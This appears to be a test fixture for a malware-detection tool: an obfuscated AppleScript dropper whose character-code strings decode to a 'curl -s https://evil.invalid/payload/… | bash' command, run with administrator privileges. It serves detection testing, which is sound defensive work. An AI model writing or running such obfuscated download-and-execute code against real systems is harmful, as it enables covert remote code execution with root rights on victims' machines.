-- Obfuscated AppleScript dropper sample for Loupe detection testing.
-- Demonstrates the `property _randomName : <char-code chain>` pattern
-- plus cross-reference resolution to a `do shell script` sink.
-- 
-- This file has no line-comments in property bindings (AppleScript
-- comment rules would interfere with YARA rule matching). All
-- real obfuscation sample shapes seen in the wild avoid comments.

property _X7ahKqpL93 : ((ASCII character 104) & (ASCII character 116) & (ASCII character 116) & (ASCII character 112) & (ASCII character 115) & ":" & (ASCII character 47) & (ASCII character 47))
property _Y29nbVk3a1 : ((character id 101) & (character id 118) & (character id 105) & (character id 108) & "." & (character id 105) & (character id 110) & (character id 118) & (character id 97) & (character id 108) & (character id 105) & (character id 100))
property _Z8kWCXGBz4 : _X7ahKqpL93 & _Y29nbVk3a1 & "/payload/"
property _W55fc29d3e : ((character id 53) & (character id 53) & (character id 102) & (character id 99) & "2" & (ASCII character 57) & (character id 100) & "3e5" & (character id 56) & "c" & (ASCII character 101) & (character id 102) & (character id 48) & (ASCII character 51) & (ASCII character 49) & (ASCII character 102) & "f6" & (character id 55) & (ASCII character 100) & (ASCII character 99) & (ASCII character 99) & "6c" & (character id 51) & (ASCII character 101) & (ASCII character 52) & (ASCII character 48) & (character id 49) & "a")
property _V4curlFla9 : ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108) & " -s ")

on run
    set _PayloadURL to _Z8kWCXGBz4 & _W55fc29d3e
    set _Cmd to _V4curlFla9 & _PayloadURL & " | bash"
    do shell script _Cmd with administrator privileges
end run
